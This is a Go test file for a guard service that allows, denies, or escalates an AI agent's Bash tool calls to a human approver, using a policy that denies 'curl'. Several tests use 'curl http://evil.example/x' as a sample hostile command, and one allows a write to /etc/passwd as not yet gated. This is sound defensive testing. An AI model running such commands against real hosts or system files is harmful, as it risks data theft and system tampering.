package guard

import (
	"context"
	"encoding/json"
	"path/filepath"
	"testing"
	"time"

	"github.com/Kubedoll-Heavy-Industries/agentcontainers/internal/approval"
	"github.com/Kubedoll-Heavy-Industries/agentcontainers/internal/mcpproxy"
)

// newTestService builds a Service whose policy denies the `curl` binary, so
// tests don't depend on the exact contents of the built-in defaults.
func newTestService(t *testing.T, broker *approval.ToolCallBroker) *Service {
	t.Helper()
	sec := mcpproxy.DefaultSecurityPolicy()
	sec.DeniedBinaries = []string{"curl"}
	cp, err := mcpproxy.Compile(sec, nil)
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	ev, err := mcpproxy.NewEvaluator(context.Background(), "agent", cp)
	if err != nil {
		t.Fatalf("evaluator: %v", err)
	}
	return New(Options{Evaluator: ev, OutputFlags: cp.OutputFlags, Broker: broker})
}

func bashReq(command string) Request {
	in, _ := json.Marshal(map[string]string{"command": command})
	return Request{ToolName: "Bash", ToolInput: in, Cwd: "/workspace"}
}

func TestDecideAllowsBenignCommand(t *testing.T) {
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), bashReq("ls -la /workspace"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow", v.Decision, v.Reason)
	}
}

func TestDecideDeniesPolicyViolationWithoutBroker(t *testing.T) {
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny", v.Decision)
	}
	if v.Reason == "" {
		t.Error("expected a denial reason")
	}
}

func TestDecideEscalatesAndHumanApproves(t *testing.T) {
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, true, "alice")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow after approval", v.Decision, v.Reason)
	}
	if v.Decider != "alice" {
		t.Errorf("decider = %q, want alice", v.Decider)
	}
}

func TestDecideEscalatesAndHumanDenies(t *testing.T) {
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, false, "bob")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny after rejection", v.Decision)
	}
}

func TestDecideAllowsNonBashTool(t *testing.T) {
	svc := newTestService(t, nil)
	in, _ := json.Marshal(map[string]string{"file_path": "/etc/passwd", "content": "x"})
	v := svc.Decide(context.Background(), Request{ToolName: "Write", ToolInput: in})
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow (Write not yet gated)", v.Decision)
	}
}

func TestSocketRoundTrip(t *testing.T) {
	svc := newTestService(t, nil)
	sockPath := filepath.Join(t.TempDir(), "guard.sock")
	l, err := Listen(sockPath, svc, nil)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = l.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = l.Serve(ctx) }()

	payload, _ := json.Marshal(bashReq("curl http://evil.example/x"))
	v, err := Ask(sockPath, payload, 2*time.Second, 5*time.Second)
	if err != nil {
		t.Fatalf("ask: %v", err)
	}
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny over socket", v.Decision)
	}
}

// autoResolve plays the human: it resolves each pending broker request with a
// fixed verdict.
func autoResolve(b *approval.ToolCallBroker, approve bool, decider string) {
	for req := range b.Subscribe() {
		_ = b.Resolve(req.ID, approval.ToolCallDecision{Approved: approve, Decider: decider})
	}
}
